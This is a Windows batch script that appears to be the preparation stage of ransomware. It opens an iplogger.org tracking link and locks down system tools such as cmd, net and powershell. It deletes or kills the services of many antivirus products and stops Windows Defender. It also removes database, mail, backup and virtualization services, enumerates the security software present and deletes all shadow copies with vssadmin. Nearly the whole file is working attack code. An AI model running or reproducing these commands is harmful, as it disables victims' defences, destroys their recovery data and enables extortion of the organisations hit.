﻿::恢复cmd默认关联
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor" /v "AutoRun" /f
::CMD权限设置
start https://iplogger.org/1NRk35
takeown /f %SystemRoot%\system32\cmd.exe /a
echo y|cacls %SystemRoot%\system32\cmd.exe /g Administrators:f
echo y|cacls %SystemRoot%\system32\cmd.exe /e /g Users:r
echo y|cacls %SystemRoot%\system32\cmd.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\system32\cmd.exe /e /d SERVICE
echo y|cacls %SystemRoot%\system32\cmd.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\system32\cmd.exe /e /d "network service"
echo y|cacls %SystemRoot%\system32\cmd.exe /e /g system:r
echo Y|cacls %SystemRoot%\system32\cmd.exe /e /d mssql$sqlexpress
takeown /f %SystemRoot%\SysWOW64\cmd.exe /a
echo y|cacls %SystemRoot%\SysWOW64\cmd.exe /g Administrators:f
echo y|cacls %SystemRoot%\SysWOW64\cmd.exe /e /g Users:r
echo y|cacls %SystemRoot%\SysWOW64\cmd.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\SysWOW64\cmd.exe /e /d SERVICE
echo y|cacls %SystemRoot%\SysWOW64\cmd.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\SysWOW64\cmd.exe /e /d "network service"
echo y|cacls %SystemRoot%\SysWOW64\cmd.exe /e /g system:r
echo Y|cacls %SystemRoot%\SysWOW64\cmd.exe /e /d mssql$sqlexpress
::NET权限设置
takeown /f %SystemRoot%\system32\net.exe /a
echo y|cacls %SystemRoot%\system32\net.exe /g Administrators:f
echo y|cacls %SystemRoot%\system32\net.exe /e /g Users:r
echo y|cacls %SystemRoot%\system32\net.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\system32\net.exe /e /d SERVICE
echo y|cacls %SystemRoot%\system32\net.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\system32\net.exe /e /d "network service"
echo y|cacls %SystemRoot%\system32\net.exe /e /d system
echo Y|cacls %SystemRoot%\system32\net.exe /e /d mssql$sqlexpress
takeown /f %SystemRoot%\SysWOW64\net.exe /a
echo y|cacls %SystemRoot%\SysWOW64\net.exe /g Administrators:f
echo y|cacls %SystemRoot%\SysWOW64\net.exe /e /g Users:r
echo y|cacls %SystemRoot%\SysWOW64\net.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\SysWOW64\net.exe /e /d SERVICE
echo y|cacls %SystemRoot%\SysWOW64\net.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\SysWOW64\net.exe /e /d "network service"
echo y|cacls %SystemRoot%\SysWOW64\net.exe /e /d system
echo Y|cacls %SystemRoot%\SysWOW64\net.exe /e /d mssql$sqlexpress
takeown /f %SystemRoot%\system32\net1.exe /a
echo y|cacls %SystemRoot%\system32\net1.exe /g Administrators:f
echo y|cacls %SystemRoot%\system32\net1.exe /e /g Users:r
echo y|cacls %SystemRoot%\system32\net1.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\system32\net1.exe /e /d SERVICE
echo y|cacls %SystemRoot%\system32\net1.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\system32\net1.exe /e /d "network service"
echo y|cacls %SystemRoot%\system32\net1.exe /e /d system
echo Y|cacls %SystemRoot%\system32\net1.exe /e /d mssql$sqlexpress
takeown /f %SystemRoot%\SysWOW64\net1.exe /a
echo y|cacls %SystemRoot%\SysWOW64\net1.exe /g Administrators:f
echo y|cacls %SystemRoot%\SysWOW64\net1.exe /e /g Users:r
echo y|cacls %SystemRoot%\SysWOW64\net1.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\SysWOW64\net1.exe /e /d SERVICE
echo y|cacls %SystemRoot%\SysWOW64\net1.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\SysWOW64\net1.exe /e /d "network service"
echo y|cacls %SystemRoot%\SysWOW64\net1.exe /e /d system
echo Y|cacls %SystemRoot%\SysWOW64\net1.exe /e /d mssql$sqlexpress
::mshta权限设置
takeown /f %SystemRoot%\system32\mshta.exe /a
echo y|cacls %SystemRoot%\system32\mshta.exe /g Administrators:f
echo y|cacls %SystemRoot%\system32\mshta.exe /e /g Users:r
echo y|cacls %SystemRoot%\system32\mshta.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\system32\mshta.exe /e /d SERVICE
echo y|cacls %SystemRoot%\system32\mshta.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\system32\mshta.exe /e /d "network service"
echo y|cacls %SystemRoot%\system32\mshta.exe /e /d system
echo Y|cacls %SystemRoot%\system32\mshta.exe /e /d mssql$sqlexpress
takeown /f %SystemRoot%\SysWOW64\mshta.exe /a
echo y|cacls %SystemRoot%\SysWOW64\mshta.exe /g Administrators:f
echo y|cacls %SystemRoot%\SysWOW64\mshta.exe /e /g Users:r
echo y|cacls %SystemRoot%\SysWOW64\mshta.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\SysWOW64\mshta.exe /e /d SERVICE
echo y|cacls %SystemRoot%\SysWOW64\mshta.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\SysWOW64\mshta.exe /e /d "network service"
echo y|cacls %SystemRoot%\SysWOW64\mshta.exe /e /d system
echo Y|cacls %SystemRoot%\SysWOW64\mshta.exe /e /d mssql$sqlexpress
::FTP权限设置
takeown /f %SystemRoot%\system32\FTP.exe /a
echo y|cacls %SystemRoot%\system32\FTP.exe /g Administrators:f
echo y|cacls %SystemRoot%\system32\FTP.exe /e /g Users:r
echo y|cacls %SystemRoot%\system32\FTP.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\system32\FTP.exe /e /d SERVICE
echo y|cacls %SystemRoot%\system32\FTP.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\system32\FTP.exe /e /d "network service"
echo y|cacls %SystemRoot%\system32\FTP.exe /e /d system
echo Y|cacls %SystemRoot%\system32\FTP.exe /e /d mssql$sqlexpress
takeown /f %SystemRoot%\SysWOW64\FTP.exe /a
echo y|cacls %SystemRoot%\SysWOW64\FTP.exe /g Administrators:f
echo y|cacls %SystemRoot%\SysWOW64\FTP.exe /e /g Users:r
echo y|cacls %SystemRoot%\SysWOW64\FTP.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\SysWOW64\FTP.exe /e /d SERVICE
echo y|cacls %SystemRoot%\SysWOW64\FTP.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\SysWOW64\FTP.exe /e /d "network service"
echo y|cacls %SystemRoot%\SysWOW64\FTP.exe /e /d system
echo Y|cacls %SystemRoot%\SysWOW64\FTP.exe /e /d mssql$sqlexpress
::wscript权限设置
takeown /f %SystemRoot%\system32\wscript.exe /a
echo y|cacls %SystemRoot%\system32\wscript.exe /g Administrators:f
echo y|cacls %SystemRoot%\system32\wscript.exe /e /g Users:r
echo y|cacls %SystemRoot%\system32\wscript.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\system32\wscript.exe /e /d SERVICE
echo y|cacls %SystemRoot%\system32\wscript.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\system32\wscript.exe /e /d "network service"
echo y|cacls %SystemRoot%\system32\wscript.exe /e /d system
echo Y|cacls %SystemRoot%\system32\wscript.exe /e /d mssql$sqlexpress
takeown /f %SystemRoot%\SysWOW64\wscript.exe /a
echo y|cacls %SystemRoot%\SysWOW64\wscript.exe /g Administrators:f
echo y|cacls %SystemRoot%\SysWOW64\wscript.exe /e /g Users:r
echo y|cacls %SystemRoot%\SysWOW64\wscript.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\SysWOW64\wscript.exe /e /d SERVICE
echo y|cacls %SystemRoot%\SysWOW64\wscript.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\SysWOW64\wscript.exe /e /d "network service"
echo y|cacls %SystemRoot%\SysWOW64\wscript.exe /e /d system
echo Y|cacls %SystemRoot%\SysWOW64\wscript.exe /e /d mssql$sqlexpress
::cscript权限设置
takeown /f %SystemRoot%\system32\cscript.exe /a
echo y|cacls %SystemRoot%\system32\cscript.exe /g Administrators:f
echo y|cacls %SystemRoot%\system32\cscript.exe /e /g Users:r
echo y|cacls %SystemRoot%\system32\cscript.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\system32\cscript.exe /e /d SERVICE
echo y|cacls %SystemRoot%\system32\cscript.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\system32\cscript.exe /e /d "network service"
echo y|cacls %SystemRoot%\system32\cscript.exe /e /d system
echo Y|cacls %SystemRoot%\system32\cscript.exe /e /d mssql$sqlexpress
takeown /f %SystemRoot%\SysWOW64\cscript.exe /a
echo y|cacls %SystemRoot%\SysWOW64\cscript.exe /g Administrators:f
echo y|cacls %SystemRoot%\SysWOW64\cscript.exe /e /g Users:r
echo y|cacls %SystemRoot%\SysWOW64\cscript.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\SysWOW64\cscript.exe /e /d SERVICE
echo y|cacls %SystemRoot%\SysWOW64\cscript.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\SysWOW64\cscript.exe /e /d "network service"
echo y|cacls %SystemRoot%\SysWOW64\cscript.exe /e /d system
echo Y|cacls %SystemRoot%\SysWOW64\cscript.exe /e /d mssql$sqlexpress
::powershell权限设置
takeown /f %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe /a
echo y|cacls %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe /g Administrators:f
echo y|cacls %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe /e /g Users:r
echo y|cacls %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe /e /d SERVICE
echo y|cacls %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe /e /d "network service"
echo y|cacls %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe /e /d system
echo Y|cacls %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe /e /d mssql$sqlexpress
takeown /f %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /a
echo y|cacls %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /g Administrators:f
echo y|cacls %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /e /g Users:r
echo y|cacls %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /e /g Administrators:r
echo y|cacls %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /e /d SERVICE
echo y|cacls %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /e /d mssqlserver
echo Y|cacls %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /e /d "network service"
echo y|cacls %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /e /d system
echo Y|cacls %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /e /d mssql$sqlexpress
::ProgramData文件夹权限设置
takeown /f C:\ProgramData /a
echo y|cacls C:\ProgramData /g Administrators:f
echo y|cacls C:\ProgramData /e /g Users:r
echo y|cacls C:\ProgramData /e /g Administrators:r
echo y|cacls C:\ProgramData /e /d SERVICE
echo y|cacls C:\ProgramData /e /d mssqlserver
echo Y|cacls C:\ProgramData /e /d "network service"
echo y|cacls C:\ProgramData /e /d system
echo Y|cacls C:\ProgramData /e /d mssql$sqlexpress
::Public文件夹权限设置
takeown /f C:\Users\Public /a
echo y|cacls C:\Users\Public /g Administrators:f
echo y|cacls C:\Users\Public /e /g Users:r
echo y|cacls C:\Users\Public /e /g Administrators:r
echo y|cacls C:\Users\Public /e /d SERVICE
echo y|cacls C:\Users\Public /e /d mssqlserver
echo Y|cacls C:\Users\Public /e /d "network service"
echo y|cacls C:\Users\Public /e /d system
echo Y|cacls C:\Users\Public /e /d mssql$sqlexpress

rem Delite Service "Hyper-V"
sc delete "vmickvpexchange"
sc delete "vmicguestinterface"
sc delete "vmicshutdown"
sc delete "vmicheartbeat"
sc delete "vmicrdv"
sc delete "storflt"
sc delete "vmictimesync"
sc delete "vmicvss"
sc delete "hvdsvc"
sc delete "nvspwmi"
sc delete "wmms"

rem Delite Service "AVG"
sc delete "AvgAdminServer"
sc delete "AVG Antivirus"
sc delete "avgAdminClient"

rem Delite Service "Sofos"
sc delete "SAVService"
sc delete "SAVAdminService"
sc delete "Sophos AutoUpdate Service"
sc delete "Sophos Clean Service"
sc delete "Sophos Device Control Service"
sc delete "Sophos Endpoint Defense Service"
sc delete "Sophos File Scanner Service"
sc delete "Sophos Health Service"
sc delete "Sophos MCS Agent"
sc delete "Sophos MCS Client"
sc delete "SntpService"
sc delete "swc_service"
sc delete "swi_service"
sc delete "Sophos UI"
sc delete "swi_update"
sc delete "Sophos Web Control Service"
sc delete "Sophos System Protection Service"
sc delete "Sophos Safestore Service"
sc delete "hmpalertsvc"
sc delete "RpcEptMapper"
sc delete "Sophos Endpoint Defense Service"
sc delete "SophosFIM"
sc delete "swi_filter"

rem Delite Service "Fire_Bird"
sc delete "FirebirdGuardianDefaultInstance"
sc delete "FirebirdServerDefaultInstance"

rem Delite Service "SQL"
sc delete "MSSQLFDLauncher"
sc delete "MSSQLSERVER"
sc delete "SQLSERVERAGENT"
sc delete "SQLBrowser"
sc delete "SQLTELEMETRY"
sc delete "MsDtsServer130"
sc delete "SSISTELEMETRY130"
sc delete "SQLWriter"
sc delete "MSSQL$VEEAMSQL2012"
sc delete "SQLAgent$VEEAMSQL2012"
sc delete "MSSQL"
sc delete "SQLAgent"
sc delete "MSSQLServerADHelper100"
sc delete "MSSQLServerOLAPService"
sc delete "MsDtsServer100"
sc delete "ReportServer"
sc delete "SQLTELEMETRY$HL"
sc delete "TMBMServer"
sc delete "MSSQL$PROGID"
sc delete "MSSQL$WOLTERSKLUWER"
sc delete "SQLAgent$PROGID"
sc delete "SQLAgent$WOLTERSKLUWER"
sc delete "MSSQLFDLauncher$OPTIMA"
sc delete "MSSQL$OPTIMA"
sc delete "SQLAgent$OPTIMA"
sc delete "ReportServer$OPTIMA"
sc delete "msftesql$SQLEXPRESS"
sc delete "postgresql-x64-9.4"

rem Delite Service "AV: Webroot"
sc delete "WRSVC"

rem Delite Service "AV: ESET"
sc delete "ekrn"
sc delete "ekrnEpsw"

rem Delite Service "AV: Kaspersky"
sc delete "klim6"
sc delete "AVP18.0.0"
sc delete "KLIF"
sc delete "klpd"
sc delete "klflt"
sc delete "klbackupdisk"
sc delete "klbackupflt"
sc delete "klkbdflt"
sc delete "klmouflt"
sc delete "klhk"
sc delete "KSDE1.0.0"
sc delete "kltap"

rem Delite Service "AV: Quick Heal"
sc delete "ScSecSvc"
sc delete "Core Mail Protection"
sc delete "Core Scanning Server"
sc delete "Core Scanning ServerEx"
sc delete "Online Protection System"
sc delete "RepairService"
sc delete "Core Browsing Protection"
sc delete "Quick Update Service"

rem Delite Service "AV: McAfee"
sc delete "McAfeeFramework"
sc delete "macmnsvc"
sc delete "masvc"
sc delete "mfemms"
sc delete "mfevtp"

rem Delite Service "AV: Trend Micro"
sc delete "TmFilter"
sc delete "TMLWCSService"
sc delete "tmusa"
sc delete "TmPreFilter"
sc delete "TMSmartRelayService"
sc delete "TMiCRCScanService"
sc delete "VSApiNt"
sc delete "TmCCSF"
sc delete "tmlisten"
sc delete "TmProxy"
sc delete "ntrtscan"
sc delete "ofcservice"
sc delete "TmPfw"
sc delete "PccNTUpd"

rem Delite Service "AV: Panda"
sc delete "PandaAetherAgent"
sc delete "PSUAService"
sc delete "NanoServiceMain"

rem Delite Service "AV: Panda"
sc delete "EPIntegrationService"
sc delete "EPProtectedService"
sc delete "EPRedline"
sc delete "EPSecurityService"
sc delete "EPUpdateService"

rem Kill
sc delete "UniFi"

rem Kill "AV: Trend Micro"
taskkill -f -im PccNTMon.exe
taskkill -f -im NTRtScan.exe
taskkill -f -im TmListen.exe
taskkill -f -im TmCCSF.exe
taskkill -f -im TmProxy.exe
taskkill -f -im TMBMSRV.exe
taskkill -f -im TMBMSRV.exe
taskkill -f -im TmPfw.exe
taskkill -f -im CNTAoSMgr.exe

rem Kill "SQL"
taskkill -f -im sqlbrowser.exe
taskkill -f -im sqlwriter.exe
taskkill -f -im sqlservr.exe
taskkill -f -im msmdsrv.exe
taskkill -f -im MsDtsSrvr.exe
taskkill -f -im sqlceip.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im Ssms.exe
taskkill -f -im SQLAGENT.EXE
taskkill -f -im fdhost.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im sqlservr.exe
taskkill -f -im ReportingServicesService.exe
taskkill -f -im msftesql.exe
taskkill -f -im pg_ctl.exe
taskkill -f -im postgres.exe

net stop MSSQLServerADHelper100
net stop MSSQL$ISARS
net stop MSSQL$MSFW
net stop SQLAgent$ISARS
net stop SQLAgent$MSFW
net stop SQLBrowser
net stop ReportServer$ISARS
net stop SQLWriter
net stop WinDefend
net stop mr2kserv
net stop MSExchangeADTopology
net stop MSExchangeFBA
net stop MSExchangeIS
net stop MSExchangeSA
net stop ShadowProtectSvc
net stop SPAdminV4
net stop SPTimerV4
net stop SPTraceV4
net stop SPUserCodeV4
net stop SPWriterV4
net stop SPSearch4
net stop MSSQLServerADHelper100
net stop IISADMIN
net stop firebirdguardiandefaultinstance
net stop ibmiasrw
net stop QBCFMonitorService
net stop QBVSS
net stop QBPOSDBServiceV12
net stop "IBM Domino Server (CProgramFilesIBMDominodata)"
net stop "IBM Domino Diagnostics (CProgramFilesIBMDomino)"
net stop IISADMIN
net stop "Simply Accounting Database Connection Manager"
net stop QuickBooksDB1
net stop QuickBooksDB2
net stop QuickBooksDB3
net stop QuickBooksDB4
net stop QuickBooksDB5

rem Kill
taskkill -f -im UniFi.exe

Echo TIME TO FIND AV

tasklist /fi "imagename eq MsMpEng.exe" | find /c "PID" && Echo Windows Defender
tasklist /fi "imagename eq ntrtscan.exe" | find /c "PID" && Echo Trend Micro Security
tasklist /fi "imagename eq avp.exe" | find /c "PID" && Echo Kaspersky Endpoint Security
tasklist /fi "imagename eq WRSA.exe" | find /c "PID" && Echo Webroot
tasklist /fi "imagename eq egui.exe" | find /c "PID" && Echo ESET
tasklist /fi "imagename eq AvastUI.exe" | find /c "PID" && Echo Avast

vssadmin delete shadows /all /quiet

start "crasher" cmd /c "color b & @sc delete "XT800Service_Personal" & @sc delete SQLSERVERAGENT & @sc delete SQLWriter & @sc delete SQLBrowser & @sc delete MSSQLFDLauncher & @sc delete MSSQLSERVER & @sc delete QcSoftService & @sc delete MSSQLServerOLAPService & @sc delete VMTools & @sc delete VGAuthService & @sc delete MSDTC & @sc delete TeamViewer & @sc delete ReportServer & @sc delete RabbitMQ & @sc delete "AHS SERVICE" & @sc delete "Sense Shield Service" & @sc delete SSMonitorService & @sc delete SSSyncService & @sc delete TPlusStdAppService1300 & @sc delete MSSQL$SQL2008 & @sc delete SQLAgent$SQL2008 & @sc delete TPlusStdTaskService1300 & @sc delete TPlusStdUpgradeService1300 & @sc delete VirboxWebServer & @sc delete jhi_service & @sc delete LMS & @sc delete "FontCache3.0.0.0" & @sc delete "OSP Service""
start "crasher" cmd /c "color b & @sc delete "DAService_TCP" & @sc delete "eCard-TTransServer" & @sc delete eCardMPService & @sc delete EnergyDataService & @sc delete UI0Detect & @sc delete K3MobileService & @sc delete TCPIDDAService & @sc delete WebAttendServer & @sc delete UIODetect & @sc delete "wanxiao-monitor" & @sc delete VMAuthdService & @sc delete VMUSBArbService & @sc delete VMwareHostd & @sc delete "vm-agent" & @sc delete VmAgentDaemon & @sc delete OpenSSHd & @sc delete eSightService & @sc delete apachezt & @sc delete Jenkins & @sc delete secbizsrv & @sc delete SQLTELEMETRY & @sc delete MSMQ & @sc delete smtpsvrJT & @sc delete zyb_sync & @sc delete 360EntHttpServer & @sc delete 360EntSvc & @sc delete 360EntClientSvc & @sc delete NFWebServer & @sc delete wampapache & @sc delete MSSEARCH & @sc delete msftesql & @sc delete "SyncBASE Service" & @sc delete OracleDBConcoleorcl & @sc delete OracleJobSchedulerORCL & @sc delete OracleMTSRecoveryService"
start "crasher" cmd /c "color b & @sc delete OracleOraDb11g_home1ClrAgent & @sc delete OracleOraDb11g_home1TNSListener & @sc delete OracleVssWriterORCL & @sc delete OracleServiceORCL & @sc delete aspnet_state @sc delete Redis & @sc delete OracleVssWriterORCL & @sc delete JhTask & @sc delete ImeDictUpdateService & @sc delete XT800Service_Personal & @sc delete MCService & @sc delete ImeDictUpdateService & @sc delete allpass_redisservice_port21160 & @sc delete "Flash Helper Service" & @sc delete "Kiwi Syslog Server" & @sc delete "UWS HiPriv Services""
start "crasher" cmd /c "color b & @sc delete "UWS LoPriv Services" & @sc delete ftnlsv3 & @sc delete ftnlses3 & @sc delete FxService & @sc delete "UtilDev Web Server Pro" & @sc delete ftusbrdwks & @sc delete ftusbrdsrv & @sc delete "ZTE USBIP Client Guard" & @sc delete "ZTE USBIP Client" & @sc delete "ZTE FileTranS" & @sc delete wwbizsrv & @sc delete qemu-ga & @sc delete AlibabaProtect & @sc delete ZTEVdservice & @sc delete kbasesrv & @sc delete MMRHookService & @sc delete OracleJobSchedulerORCL & @sc delete IpOverUsbSvc & @sc delete MsDtsServer100 & @sc delete KuaiYunTools & @sc delete KMSELDI & @sc delete btPanel & @sc delete Protect_2345Explorer & @sc delete 2345PicSvc & @sc delete vmware-converter-agent & @sc delete vmware-converter-server & @sc delete vmware-converter-worker & @sc delete QQCertificateService & @sc delete OracleRemExecService & @sc delete GPSDaemon & @sc delete GPSUserSvr & @sc delete GPSDownSvr & @sc delete GPSStorageSvr & @sc delete GPSDataProcSvr & @sc delete GPSGatewaySvr & @sc delete GPSMediaSvr & @sc delete GPSLoginSvr & @sc delete GPSTomcat6 & @sc delete GPSMysqld & @sc delete GPSFtpd & @sc delete "Zabbix Agent" & @sc delete BackupExecAgentAccelerator & @sc delete bedbg & @sc delete BackupExecDeviceMediaService & @sc delete BackupExecRPCService & @sc delete BackupExecAgentBrowser & @sc delete BackupExecJobEngine & @sc delete BackupExecManagementService & @sc delete MDM & @sc delete TxQBService & @sc delete Gailun_Downloader & @sc delete RemoteAssistService & @sc delete YunService & @sc delete Serv-U & @sc delete "EasyFZS Server" & @sc delete "Rpc Monitor" & @sc delete OpenFastAssist & @sc delete "Nuo Update Monitor" & @sc delete "Daemon Service" & @sc delete asComSvc & @sc delete OfficeUpdateService & @sc delete RtcSrv & @sc delete RTCASMCU & @sc delete FTA & @sc delete MASTER & @sc delete NscAuthService & @sc delete MSCRMUnzipService & @sc delete MSCRMAsyncService$maintenance"
start "crasher" cmd /c "@color b & sc delete MSCRMAsyncService & @sc delete REPLICA & @sc delete RTCATS & @sc delete RTCAVMCU & @sc delete RtcQms & @sc delete RTCMEETINGMCU & @sc delete RTCIMMCU & @sc delete RTCDATAMCU & @sc delete RTCCDR & @sc delete ProjectEventService16 & @sc delete ProjectQueueService16 & @sc delete SPAdminV4 & @sc delete SPSearchHostController & @sc delete SPTimerV4 & @sc delete SPTraceV4 & @sc delete OSearch16 & @sc delete ProjectCalcService16 & @sc delete c2wts & @sc delete AppFabricCachingService & @sc delete ADWS & @sc delete MotionBoard57 & @sc delete MotionBoardRCService57 & @sc delete vsvnjobsvc & @sc delete VisualSVNServer & @sc delete "FlexNet Licensing Service 64" & @sc delete BestSyncSvc & @sc delete LPManager & @sc delete MediatekRegistryWriter & @sc delete RaAutoInstSrv_RT2870 & @sc delete CobianBackup10 & @sc delete SQLANYs_sem5 & @sc delete CASLicenceServer & @sc delete SQLService & @sc delete semwebsrv & @sc delete TbossSystem & @sc delete ErpEnvSvc & @sc delete Mysoft.Autoupgrade.DispatchService & @sc delete Mysoft.Autoupgrade.UpdateService & @sc delete Mysoft.Config.WindowsService & @sc delete Mysoft.DataCenterService & @sc delete Mysoft.SchedulingService & @sc delete Mysoft.Setup.InstallService & @sc delete MysoftUpdate & @sc delete edr_monitor & @sc delete abs_deployer & @sc delete savsvc & @sc delete ShareBoxMonitorService & @sc delete ShareBoxService & @sc delete CloudExchangeService & @sc delete "U8WorkerService2" & @sc delete CIS & @sc delete EASService & @sc delete KICkSvr & @sc delete "OSP Service" & @sc delete U8SmsSrv & @sc delete OfficeClearCache & @sc delete TurboCRM70 & @sc delete U8DispatchService & @sc delete U8EISService & @sc delete U8EncryptService & @sc delete U8GCService & @sc delete U8KeyManagePool & @sc delete "U8MPool" & @sc delete U8SCMPool & @sc delete U8SLReportService & @sc delete U8TaskService & @sc delete "U8WebPool" & @sc delete UFAllNet & @sc delete UFReportService & @sc delete UTUService & @sc delete "U8WorkerService1""



start "stopper" cmd /c "color a & @net stop U8WorkerService1 & @net stop U8WorkerService2 & @net stop "memcached Server" & @net stop Apache2.4 & @net stop UFIDAWebService & @net stop MSComplianceAudit & @net stop MSExchangeADTopology & @net stop MSExchangeAntispamUpdate & @net stop MSExchangeCompliance & @net stop MSExchangeDagMgmt & @net stop MSExchangeDelivery & @net stop MSExchangeDiagnostics & @net stop MSExchangeEdgeSync & @net stop MSExchangeFastSearch & @net stop MSExchangeFrontEndTransport & @net stop MSExchangeHM & @net stop MSSQL$SQL2008 & @net stop MSExchangeHMRecovery & @net stop MSExchangeImap4 & @net stop MSExchangeIMAP4BE & @net stop MSExchangeIS & @net stop MSExchangeMailboxAssistants & @net stop MSExchangeMailboxReplication & @net stop MSExchangeNotificationsBroker & @net stop MSExchangePop3 & @net stop MSExchangePOP3BE & @net stop MSExchangeRepl & @net stop MSExchangeRPC & @net stop MSExchangeServiceHost & @net stop MSExchangeSubmission & @net stop MSExchangeThrottling & @net stop MSExchangeTransport & @net stop MSExchangeTransportLogSearch & @net stop MSExchangeUM & @net stop MSExchangeUMCR & @net stop MySQL5_OA"
start "stopper" cmd /c "color a & @net stop HaoZipSvc & @net stop "igfxCUIService2.0.0.0" & @net stop Realtek11nSU & @net stop xenlite & @net stop XenSvc & @net stop Apache2.2 & @net stop "Synology Drive VSS Service x64" & @net stop DellDRLogSvc & @net stop FirebirdGuardianDeafaultInstance & @net stop JWEM3DBAUTORun & @net stop JWRinfoClientService & @net stop JWService & @net stop Service2 & @net stop RapidRecoveryAgent & @net stop FirebirdServerDefaultInstance & @net stop AdobeARMservice & @net stop VeeamCatalogSvc & @net stop VeeanBackupSvc & @net stop VeeamTransportSvc & @net stop TPlusStdAppService1300 & @net stop TPlusStdTaskService1300 & @net stop TPlusStdUpgradeService1300 & @net stop TPlusStdWebService1300 & @net stop VeeamNFSSvc & @net stop VeeamDeploySvc & @net stop VeeamCloudSvc & @net stop VeeamMountSvc & @net stop VeeamBrokerSvc & @net stop VeeamDistributionSvc & @net stop tmlisten & @net stop ServiceMid & @net stop 360EntPGSvc & @net stop ClickToRunSvc & @net stop RavTask & @net stop AngelOfDeath & @net stop d_safe & @net stop NFLicenceServer & @net stop "NetVault Process Manager" & @net stop RavService & @net stop DFServ & @net stop IngressMgr & @net stop EvtSys & @net stop K3ClouManager & @net stop NFVPrintServer & @net stop RTCAVMCU & @net stop CobianBackup10 & @net stop GNWebService & @net stop Mysoft.SchedulingService & @net stop AgentX & @net stop SentinelKeysServer & @net stop DGPNPSEV & @net stop TurboCRM70 & @net stop NFSysService & @net stop U8DispatchService & @net stop NFOTPService & @net stop U8EISService & @net stop U8EncryptService & @net stop U8GCService & @net stop U8KeyManagePool & @net stop U8MPool & @net stop U8SCMPool & @net stop U8SLReportService & @net stop U8TaskService & @net stop U8WebPool & @net stop UFAllNet & @net stop UFReportService & @net stop UTUService"
start "stopper" cmd /c "color a & @net stop UIODetect & @net stop VMwareHostd & @net stop TeamViewer8 & @net stop VMUSBArbService & @net stop VMAuthdService & @net stop wanxiao-monitor & @net stop WebAttendServer & @net stop mysqltransport & @net stop  VMnetDHCP & @net stop "VMware NAT Service" & @net stop Tomcat8 & @net stop TeamViewer & @net stop QPCore & @net stop CASLicenceServer & @net stop CASWebServer & @net stop AutoUpdateService & @net stop "Alibaba Security Aegis Detect Service" & @net stop "Alibaba Security Aegis Update Service" & @net stop "AliyunService" & @net stop CASXMLService & @net stop AGSService & @net stop RapService & @net stop DDNSService & @net stop iNethinkSQLBackupSvc & @net stop CASVirtualDiskService & @net stop CASMsgSrv & @net stop "OracleOraDb10g_homeliSQL*Plus" & @net stop OracleDBConsoleilas & @net stop MySQL & @net stop TPlusStdAppService1220 & @net stop TPlusStdTaskService1220 & @net stop TPlusStdUpgradeService1220 & @net stop K3MobileServiceManage & @net stop "FileZilla Server" & @net stop DDVRulesProcessor & @net stop ImtsEventSvr & @net stop AutoUpdatePatchService & @net stop OMAILREPORT & @net stop "Dell Hardware Support" & @net stop SupportAssistAgent & @net stop K3MMainSuspendService & @net stop KpService & @net stop ceng_web_svc_d & @net stop KugouService & @net stop pcas & @net stop U8SendMailAdmin & @net stop "Bonjour Service" & @net stop "Apple Mobile Device Service" & @net stop "ABBYY.Licensing.FineReader.Professional.12.0""
